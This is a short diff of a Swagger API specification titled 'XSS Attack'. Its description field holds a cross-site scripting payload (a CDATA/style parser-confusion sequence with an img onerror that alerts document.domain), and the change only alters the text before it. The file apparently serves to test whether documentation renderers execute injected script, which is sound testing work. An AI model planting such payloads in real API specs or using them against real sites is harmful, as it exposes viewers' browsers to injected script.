@@ -2,7 +2,7 @@ swagger: "2.0"
 info:
   title: XSS Attack tan
   description: |
-    a<style><![CDATA[</style><div data-x="]]></style><img src=x onerror=alert(document.domain)><style><!--"></div><style>--></style></div>
+    hello<style><![CDATA[</style><div data-x="]]></style><img src=x onerror=alert(document.domain)><style><!--"></div><style>--></style></div>
 
   version: production
 basePath: /JSSResource/
